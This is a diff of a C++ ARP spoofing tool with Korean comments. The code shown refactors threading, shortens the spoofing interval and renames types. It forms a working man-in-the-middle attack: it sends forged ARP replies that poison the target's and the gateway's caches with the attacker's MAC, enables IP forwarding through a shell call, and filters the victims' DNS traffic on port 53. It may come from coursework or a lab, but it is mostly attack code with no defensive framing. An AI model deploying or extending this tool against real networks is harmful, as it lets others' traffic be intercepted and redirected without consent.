@@ -1,6 +1,5 @@
 #include "arp_spoof.hpp"
 #include "network_utils.hpp"
-#include "dns_spoof.hpp"  // 필요 시 DNS 스푸핑 호출
 #include <iostream>
 #include <cstring>
 #include <csignal>
@@ -9,11 +8,26 @@
 #include <net/if.h>
 #include <sys/ioctl.h>
 #include <cstdlib>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/if_ether.h> 
 
 using namespace std;
+using namespace NetworkUtils;
 
-// SpoofTarget 클래스 구현
-SpoofTarget::SpoofTarget(const string& ip_str_) : ip_str(ip_str_), running(false) 
+
+ArpSpoofer* ArpSpoofer::global_instance = nullptr;
+
+void spoofing_thread_func(SpoofTarget* t) {
+    while(t->is_running()) {
+        ArpSpoofer::global_instance->send_arp_spoofing_packet(t);
+        usleep(500000);
+    }
+}
+
+// SpoofTarget 구현
+
+SpoofTarget::SpoofTarget(const std::string& ip_str_) : ip_str(ip_str_), running(false) 
 {
     string_to_ip(ip_str_.c_str(), ip);
     memset(mac, 0, 6);
@@ -24,24 +38,19 @@ SpoofTarget::~SpoofTarget()
     stop_thread();
 }
 
-void SpoofTarget::stop_thread() 
-{
-    if (running && thread_ptr && thread_ptr->joinable()) 
-    {
-        running = false;
-        thread_ptr->join();
-    }
+pcap_t* ArpSpoofer::get_handle() const {
+    return handle;
 }
 
-const u_int8_t* SpoofTarget::get_ip() const {
+const uint8_t* SpoofTarget::get_ip() const {
     return ip;
 }
 
-const u_int8_t* SpoofTarget::get_mac() const {
+const uint8_t* SpoofTarget::get_mac() const {
     return mac;
 }
 
-const string& SpoofTarget::get_ip_str() const {
+const std::string& SpoofTarget::get_ip_str() const {
     return ip_str;
 }
 
@@ -49,12 +58,27 @@ bool SpoofTarget::is_running() const {
     return running;
 }
 
-void SpoofTarget::set_mac(const u_int8_t* mac_) {
+void SpoofTarget::set_mac(const uint8_t* mac_) {
     memcpy(mac, mac_, 6);
 }
 
-// ArpSpoofer 클래스 구현
-ArpSpoofer::ArpSpoofer(const string& iface) : interface(iface), handle(nullptr) 
+void SpoofTarget::start_thread(void (*threadFunc)(SpoofTarget*), SpoofTarget* target) {
+    if (!running) {
+        running = true;
+        thread_ptr = std::make_unique<std::thread>(threadFunc, target);
+    }
+}
+
+void SpoofTarget::stop_thread() {
+    if (running && thread_ptr && thread_ptr->joinable()) {
+        running = false;
+        thread_ptr->join();
+    }
+}
+
+// ArpSpoofer 구현
+
+ArpSpoofer::ArpSpoofer(const std::string& iface) : interface(iface), handle(nullptr) 
 {
     memset(errbuf, 0, PCAP_ERRBUF_SIZE);
     memset(attacker_mac, 0, 6);
@@ -72,6 +96,7 @@ ArpSpoofer::~ArpSpoofer()
 
 bool ArpSpoofer::initialize() 
 {
+    // 타임아웃을 100ms로 단축하여 빠른 패킷 캡처
     handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 100, errbuf);
     if (handle == nullptr) 
     {
@@ -97,8 +122,7 @@ bool ArpSpoofer::initialize()
     return true;
 }
 
-bool ArpSpoofer::set_gateway(const string& gateway_ip_str_) 
-{
+bool ArpSpoofer::set_gateway(const std::string& gateway_ip_str_) {
     gateway_ip_str = gateway_ip_str_;
     string_to_ip(gateway_ip_str.c_str(), gateway_ip);
     
@@ -106,8 +130,7 @@ bool ArpSpoofer::set_gateway(const string& gateway_ip_str_)
     cout << "Attacker IP: " << ip_to_string(attacker_ip) << "\n";
     cout << "Gateway IP: " << ip_to_string(gateway_ip) << "\n";
     
-    if (!get_mac_from_ip(gateway_ip, gateway_mac)) 
-    {
+    if (!get_mac_from_ip(gateway_ip, gateway_mac)) {
         cerr << "Failed to get gateway MAC.\n";
         return false;
     }
@@ -115,71 +138,26 @@ bool ArpSpoofer::set_gateway(const string& gateway_ip_str_)
     return true;
 }
 
-bool ArpSpoofer::add_target(const string& target_ip_str) 
-{
-    auto target = make_unique<SpoofTarget>(target_ip_str);
-    u_int8_t target_mac[6];
-    if (!get_mac_from_ip(target->get_ip(), target_mac)) 
-    {
+bool ArpSpoofer::add_target(const std::string& target_ip_str) {
+    auto target = std::make_unique<SpoofTarget>(target_ip_str);
+    uint8_t target_mac[6];
+    if (!get_mac_from_ip(target->get_ip(), target_mac)) {
         cerr << "Failed to get target MAC: " << target_ip_str << "\n";
         return false;
     }
     target->set_mac(target_mac);
     cout << "Added spoof target - IP: " << target_ip_str 
-              << ", MAC: " << mac_to_string(target_mac) << "\n";
-    lock_guard<std::mutex> lock(mutex);
-    targets.push_back(move(target));
+         << ", MAC: " << mac_to_string(target_mac) << "\n";
+    std::lock_guard<std::mutex> lock(mutex);
+    targets.push_back(std::move(target));
     return true;
 }
 
-bool ArpSpoofer::get_mac_from_ip(const u_int8_t* target_ip, u_int8_t* target_mac) 
-{
-    cout << "Searching MAC for IP: " << ip_to_string(target_ip) << "\n";
-    u_int8_t packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
-    const int MAX_ATTEMPTS = 3;
-    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) 
-    {
-        create_arp_packet(packet, attacker_mac, BROADCAST_MAC, attacker_ip, target_ip, 1);
-        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) 
-        {
-            cerr << "Packet send failed: " << pcap_geterr(handle) << "\n";
-            continue;
-        }
-        struct pcap_pkthdr header;
-        const u_char* packet_data;
-        time_t start_time = time(NULL);
-        while (time(NULL) - start_time < 10) 
-        {
-            packet_data = pcap_next(handle, &header);
-            if (packet_data == nullptr)
-            {   
-                continue;
-            }
-            struct ether_header* eth = (struct ether_header*)packet_data;
-            
-            if (ntohs(eth->ether_type) != ETHERTYPE_ARP)
-            {
-                continue;
-            }
-            
-            struct arp_header* arp = (struct arp_header*)(packet_data + sizeof(struct ether_header));
-            if (memcmp(arp->spa, target_ip, 4) == 0) 
-            {
-                memcpy(target_mac, arp->sha, 6);
-                cout << "Found MAC: " << mac_to_string(target_mac) << "\n";
-                return true;
-            }
-        }
-    }
-    return false;
-}
 
-// Target의 IP에 해당하는 PACKET만 받아 보기 위해 FILETER 처리 진행
 bool ArpSpoofer::update_filter() {
-    // Build a more strict filter for DNS packets
-    string filter_exp = "((arp or (ip and (udp port 53))) and (host " + ip_to_string(gateway_ip);
+    std::string filter_exp = "((arp or (ip and udp port 53)) and (host " + ip_to_string(gateway_ip);
     {
-        lock_guard<std::mutex> lock(mutex);
+        std::lock_guard<std::mutex> lock(mutex);
         for (const auto& target : targets)
             filter_exp += " or host " + target->get_ip_str();
     }
@@ -197,7 +175,7 @@ bool ArpSpoofer::update_filter() {
         return false;
     }
     cout << "Dynamic filter set: " << filter_exp << "\n";
-    pcap_freecode(&fp);  // Free the BPF program
+    pcap_freecode(&fp);
     return true;
 }
 
@@ -207,49 +185,53 @@ void ArpSpoofer::spoof_target_thread(SpoofTarget* target)
     while (target->is_running()) 
     {
         send_arp_spoofing_packet(target);
-        usleep(500000);
+        usleep(100000);
     }
     cout << "Stopping spoofing for target " << target->get_ip_str() << "\n";
 }
 
 void ArpSpoofer::send_arp_spoofing_packet(const SpoofTarget* target) 
 {
-    u_int8_t packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
+    uint8_t packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
 
-    // Target으로 ARP 전달
+    // 대상에 대한 ARP 스푸핑: 공격자 MAC을 사용하여 게이트웨이 IP를 속임.
     create_arp_packet(packet, attacker_mac, target->get_mac(), gateway_ip, target->get_ip(), 2);
+
     if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
     {
-        cerr << "Failed to send spoof packet to target: " << pcap_geterr(handle) << "\n";
+        std::cerr << "Failed to send spoof packet to target: " << pcap_geterr(handle) << "\n";
     }
-    // gateway로 ARP전달
+
+    // 게이트웨이에 대한 ARP 스푸핑 패킷도 전송
     create_arp_packet(packet, attacker_mac, gateway_mac, target->get_ip(), gateway_ip, 2);
+
     if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
     {
-        cerr << "Failed to send spoof packet to gateway: " << pcap_geterr(handle) << "\n";
+        std::cerr << "Failed to send spoof packet to gateway: " << pcap_geterr(handle) << "\n";
     }
-    
 }
+
 
 void ArpSpoofer::start_spoofing_all() 
 {
-    lock_guard<std::mutex> lock(mutex);
+    global_instance = this;
+    
+    std::lock_guard<std::mutex> lock(mutex);
     for (auto& target : targets) 
     {
         if (!target->is_running())
-            target->start_thread(&ArpSpoofer::spoof_target_thread, this, target.get());
+            target->start_thread(spoofing_thread_func, target.get());
     }
 }
 
 void ArpSpoofer::send_recover_arp_packets() 
 {
     cout << "Restoring ARP tables...\n";
-    lock_guard<std::mutex> lock(mutex);
+    std::lock_guard<std::mutex> lock(mutex);
 
     for (auto& target : targets) 
     {
-        // target 주소를 게이트웨이에게 정상화 전달
-        u_int8_t gateway_recov_packet[sizeof(struct ether_header) + sizeof(struct arp_header)];
+        uint8_t gateway_recov_packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
         create_arp_packet(gateway_recov_packet, target->get_mac(), gateway_mac, target->get_ip(), gateway_ip, 2);
         if (pcap_sendpacket(handle, gateway_recov_packet, sizeof(gateway_recov_packet)) != 0)
         {
@@ -259,10 +241,8 @@ void ArpSpoofer::send_recover_arp_packets()
         {
             cout << "Recovery packet sent to gateway: " << target->get_ip_str() << " -> " << ip_to_string(gateway_ip) << "\n";
         }
-        // 게이트웨이 주소를 target에게 정상화 전달            
-        u_int8_t packet2[sizeof(struct ether_header) + sizeof(struct arp_header)];
+        uint8_t packet2[sizeof(struct ether_header) + sizeof(struct ether_arp)];
         create_arp_packet(packet2, gateway_mac, target->get_mac(), gateway_ip, target->get_ip(), 2);
-
         if (pcap_sendpacket(handle, packet2, sizeof(packet2)) != 0)
         {
             cerr << "Failed to send recovery packet to target: " << pcap_geterr(handle) << "\n";
@@ -284,7 +264,7 @@ void ArpSpoofer::stop_all()
 {
     cout << "Stopping all spoofing...\n";
     send_recover_arp_packets();
-    lock_guard<std::mutex> lock(mutex);
+    std::lock_guard<std::mutex> lock(mutex);
     for (auto& target : targets)
     {
         target->stop_thread();
@@ -292,16 +272,47 @@ void ArpSpoofer::stop_all()
     cout << "All spoofing threads stopped.\n";
 }
 
-bool ArpSpoofer::enable_ip_forwarding() 
-{
+bool ArpSpoofer::enable_ip_forwarding() {
     system("echo 1 > /proc/sys/net/ipv4/ip_forward");
     cout << "Enabled IP forwarding.\n";
     return true;
 }
 
-bool ArpSpoofer::disable_ip_forwarding()
-{
+bool ArpSpoofer::disable_ip_forwarding() {
     system("echo 0 > /proc/sys/net/ipv4/ip_forward");
     cout << "Disabled IP forwarding.\n";
     return true;
+}
+
+
+bool ArpSpoofer::get_mac_from_ip(const uint8_t* target_ip, uint8_t* target_mac) {
+    cout << "Searching MAC for IP: " << ip_to_string(target_ip) << "\n";
+    uint8_t packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
+    const int MAX_ATTEMPTS = 3;
+    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
+        // ARP 요청 패킷 생성: oper = 1 (ARP request)
+        create_arp_packet(packet, attacker_mac, BROADCAST_MAC, attacker_ip, target_ip, 1);
+        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
+            cerr << "Packet send failed: " << pcap_geterr(handle) << "\n";
+            continue;
+        }
+        struct pcap_pkthdr header;
+        const u_char* packet_data;
+        time_t start_time = time(NULL);
+        while (time(NULL) - start_time < 10) {
+            packet_data = pcap_next(handle, &header);
+            if (packet_data == nullptr)
+                continue;
+            struct ether_header* eth = (struct ether_header*)packet_data;
+            if (ntohs(eth->ether_type) != ETHERTYPE_ARP)
+                continue;
+            struct ether_arp* arp = (struct ether_arp*)(packet_data + sizeof(struct ether_header));
+            if (memcmp(arp->arp_spa, target_ip, 4) == 0) {
+                memcpy(target_mac, arp->arp_sha, 6);
+                cout << "Found MAC: " << mac_to_string(target_mac) << "\n";
+                return true;
+            }
+        }
+    }
+    return false;
 }
